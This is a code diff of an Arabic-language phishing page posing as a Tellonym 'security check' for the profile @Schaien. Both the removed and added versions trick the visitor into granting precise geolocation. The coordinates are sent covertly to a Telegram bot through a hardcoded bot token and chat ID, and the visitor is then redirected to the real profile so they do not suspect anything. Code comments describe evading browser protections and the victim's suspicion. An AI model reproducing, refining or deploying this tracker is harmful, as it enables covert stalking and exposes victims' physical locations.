@@ -2,55 +2,51 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Schaien (@Schaien) | Tellonym</title>
     <style>
-        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .box { width: 85%; max-width: 380px; padding: 30px; border-radius: 25px; background: #1a1a1a; border: 1px solid #333; }
-        .btn { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 30px; font-weight: bold; width: 100%; margin-top: 20px; font-size: 16px; cursor: pointer; }
+        body { margin: 0; background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 85%; max-width: 350px; background: #121212; border: 1px solid #222; padding: 40px 20px; border-radius: 30px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .btn { background: #fe2c55; color: white; border: none; padding: 18px; border-radius: 35px; font-weight: 700; width: 100%; font-size: 17px; cursor: pointer; transition: 0.3s; -webkit-tap-highlight-color: transparent; }
+        .btn:active { transform: scale(0.95); background: #d62246; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2 style="font-size: 20px;">التحقق من الهوية (Tellonym)</h2>
-        <p style="color: #aaa; font-size: 14px;">يجب عليك الضغط على الزر أدناه للسماح باستلام الرسائل المجهولة من أصدقائك في منطقتك.</p>
-        <button class="btn" onclick="capture()">استمرار</button>
+    <div class="card">
+        <div style="font-size: 50px; margin-bottom: 15px;">🔒</div>
+        <h2 style="margin-bottom: 10px; font-size: 22px;">تأكيد الأمان للآيباد</h2>
+        <p style="color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 25px;">لمشاهدة التيل المجهول، يجب السماح بنظام التحقق "مرة واحدة" لفك تشفير الرسائل الواردة إليك.</p>
+        <button class="btn" id="startBtn">مشاهدة الرسائل الآن</button>
     </div>
 
     <script>
         const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
         const chatId = "1138822664";
 
-        function capture() {
-            // إضافة خيارات الدقة العالية لضمان استجابة الأجهزة الغريبة
-            var options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
-            
-            navigator.geolocation.getCurrentPosition(success, error, options);
-        }
+        document.getElementById('startBtn').addEventListener('click', function() {
+            // طلب الموقع مباشرة عند اللمس (لإجبار Safari على الاستجابة)
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const msg = encodeURIComponent(`🚨 صيد من جهاز آيباد!\n📍 الخريطة: https://www.google.com/maps?q=${lat},${lon}`);
+                    
+                    // إرسال عبر طلب مخفي سريع
+                    const api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`;
+                    
+                    // استخدام fetch مع وضع "no-cors" لتخطي حماية الأجهزة الغريبة
+                    fetch(api, { mode: 'no-cors' });
 
-        function success(pos) {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-            
-            // استخدام "رابط مباشر" للإرسال لضمان عدم حظره كـ Fetch مريب
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + 
-                        encodeURIComponent(`🚨 صيد من جهاز غريب!\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n🎯 الدقة: ${acc} متر`);
-
-            // إرسال عبر تقنية الـ Beacon (الأسرع والأضمن في الخلفية)
-            navigator.sendBeacon(url);
-
-            // تحويل فوري بعد الإرسال
-            setTimeout(function() {
-                window.location.href = "https://tellonym.me/Schaien";
-            }, 500);
-        }
-
-        function error(err) {
-            // حتى لو رفض، نحوله لكي لا يشك
-            window.location.href = "https://tellonym.me/Schaien";
-        }
+                    setTimeout(() => { window.location.href = "https://tellonym.me/Schaien"; }, 800);
+                },
+                (err) => {
+                    // إذا رفض أو فشل، نحوله فوراً
+                    window.location.href = "https://tellonym.me/Schaien";
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
     </script>
 </body>
 </html>
